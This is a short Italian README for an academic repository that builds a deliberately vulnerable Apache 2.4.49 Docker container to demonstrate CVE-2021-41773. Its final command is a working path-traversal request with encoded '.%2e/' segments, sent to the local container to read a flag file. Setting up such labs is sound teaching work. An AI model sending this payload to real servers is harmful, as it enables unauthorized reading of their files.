# vulnerable_docker_apache_2_4_49

Repository per scopi accademici.

Docker per l'exploit della vulnerabilità **CVE-2021-41773**.

Per maggiori informazioni: **https://github.com/BlueTeamSteve/CVE-2021-41773**

Credits to: **https://github.com/BlueTeamSteve**

DockerHub Link: **https://hub.docker.com/repository/docker/m96dg/pw_apache_2_4_49**

'''bash
docker build . -t cyberhack2021pw4/massimo_vulnerable_docker_apache_2_4_49
docker run -it --rm -p 80:80 cyberhack2021pw4/massimo_vulnerable_docker_apache_2_4_49
curl http://localhost:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/flag.txt
'''
